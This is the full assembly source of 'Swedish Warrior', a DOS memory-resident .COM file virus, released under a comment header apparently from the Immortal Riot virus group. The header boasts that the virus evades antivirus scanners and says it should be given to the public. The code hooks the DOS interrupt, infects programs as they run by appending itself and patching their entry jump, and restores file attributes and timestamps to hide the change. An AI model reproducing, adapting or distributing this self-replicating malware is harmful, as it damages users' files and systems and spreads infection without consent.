; VirusName: Swedish Warrior
; Origin   : Sweden
; Author   : Lord Zero
;
; Okey, I decided to include this virus, of many reasons. But first
; let's give some information about LOC (Logical Coders).
; 
; LOC (Logical Coders) turned out to be a demo-group instead of a Virus-
; group, that I thought it was. THM (Trojan Horse Maker 1.10) was just
; released by Lord Zero, ie, NOT a LOC product. Lord Zero was also
; kicked from LOC after LOC noticed 'their' release of THM. 
;
; Then why release it? Well It can't however still not be detected
; by any scanner (except Tbscan's Heuristic!). And it's a shame to
; see a virus being programmed, but not given to the major public.
; 
; A message to all of LOC, Sorry for state "LoC the new Swedish
; virus writing group", but what was I suppose to think?
; 
; I wish Lord Zero my best in his single career, or what-ever.. 
; 			         / The Unforgiven/Immortal Riot
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;		            SWEDISH WARRIOR
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
; A hardly commented non-overwriting memory resident *.COM infector.

		.MODEL TINY
		.CODE
		org	100h


Start:
		call	go
go:		pop	bp
		push	ax
		push	cx
		sub	bp,offset go
		mov	ax,3D03h
		mov	dx,9eh
		int	21h
		jnc	ok

		mov	cx,cs
		mov	ds,cx
		mov	es,cx

		mov	cx,es
		dec	cx
		mov	es,cx

		mov	bx,es:[03h]

		mov	dx,offset Finish-offset Start
		mov	cl,4
		shr	dx,cl
		add	dx,4

		mov	cx,es
		inc	cx
		mov	es,cx

		sub	bx,dx
		mov	ah,4Ah
		int	21h

		jc	ok
		dec	dx
		mov	ah,48h
		mov	bx,dx
		int	21h

		jc	ok

		dec	ax
		mov	es,ax
		mov	cx,8
		mov	es:[01],cx
		mov	si,offset offset start
		add	si,bp
		sub	ax,0Fh
		mov	es,ax
		mov	di,0100h
		mov	cx,offset Finish-offset Start
		cld
		rep	movsb
		xor	ax,ax
		mov	ds,ax
		mov	di,offset oldint21
		mov	si,084h
		mov	bx,offset tsr
		call	maketsr
ok:
		push	cs
		pop	es
		push	es
		pop	ds
		mov	di,0100h
		mov	si,offset buffer
		add	si,bp
		movsw
		movsb
		pop	cx
		pop	ax
		xor	dx,dx
		push	dx
		xor	bp,bp
		xor	si,si
		xor	di,di
		mov	bx,0100h
		push	bx
		xor	bx,bx
		retn
		db	'Swedish Warrior v1.0 by Lord Zer0.'
buffer		db	90h,0CDh,20h
oldint21:
		dd	?
new_jmp		db	0e9h,00h,00h
tsr:
		pushf
		cmp	ah,4Bh		   ; check for execution,
		je	infect		   ; if so, infect it....
		cmp	ax,3D03h
		jne	gooo
		popf
		iret
gooo:
		popf
		jmp	dword ptr cs:[oldint21]
infect:
		push	ax
		push	bx
		push	cx
		push	dx
		push	bp
		push	si
		push	di
		push	ds
		push	es
		mov	ax,4300h
		int	21h
		jc	quit
		push	cx
		xor	cx,cx
		mov	ax,4301h
		int	21h

		mov	ax,3d02h
		int	21h
		push	ds
		push	dx
		push	cs
		pop	ds
		mov	bx,ax
		mov	ah,3fh
		mov	dx,offset buffer
		mov	cx,3
		int	21h
		cmp	word ptr cs:[buffer],'ZM'
		je	quitexe

		mov	ax,4202h
		xor	cx,cx
		xor	dx,dx
		int	21h

		sub	ax,offset finish-offset start+3
		cmp	ax,word ptr cs:[buffer+1]
		je	quitexe
		add	ax,offset finish-offset start
		mov	word ptr cs:[new_jmp+1],ax

		mov	ah,40h
		mov	cx,offset finish-offset start
		mov	dx,0100h
		int	21h
		jc	quitexe

		mov	ax,4200h
		xor	cx,cx
		xor	dx,dx
		int	21h

		mov	ah,40h
		mov	cl,3
		mov	dx,offset new_jmp
		int	21h
quitexe:
		mov	ax,5700h
		int	21h
		inc	al
		int	21h
		mov	ah,3eh
		int	21h
		pop	dx
		pop	ds

		pop	cx
		mov	ax,4301h
		int	21h
quit:
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	bp
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		jmp	gooo
maketsr:
		mov	ax,[si]
		mov	es:[di],ax
		mov	ax,[si+2]
		mov	es:[di+2],ax

		cli				; Disable interrupts
		mov	ds:[si],bx
		mov	ds:[si+2],es
		sti				; Enable interrupts
		ret
finish:
		end	start